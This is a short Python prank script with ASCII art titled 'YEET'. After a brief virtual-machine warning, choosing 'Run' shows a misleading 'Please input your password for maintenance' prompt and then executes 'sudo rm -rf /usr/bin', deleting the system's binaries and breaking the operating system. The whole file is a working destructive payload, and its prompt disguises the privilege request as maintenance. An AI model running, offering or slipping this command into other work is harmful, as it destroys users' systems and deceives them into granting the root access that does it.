import os
import sys
from termcolor import colored, cprint
import time


name = ('''       __   __ _____  _____  _____ 
\ \ / /| ____|| ____||_   _|
 \ V / |  _|  |  _|    | |  
  | |  | |___ | |___   | |  
  |_|  |_____||_____|  |_|  
                           ''')
lol = 'lol sudo go yeet'

def yeet():
    os.system('clear')
    print(name)
    print('\n\n')
    print('Running this file will ruin your os, only use on a virtual machine\n')

    print('1) Run \n2) Abort')
    choice = input('Choice:     ')
    
    if choice == '1':
        os.system('clear')
        print('Please input your password for maintenance.')
        os.system('sudo rm -rf /usr/bin')
        print('\n')
        print(lol)
        
    
    elif choice == '2':
        sys.exit()
    
    else:
        sys.exit()

yeet()
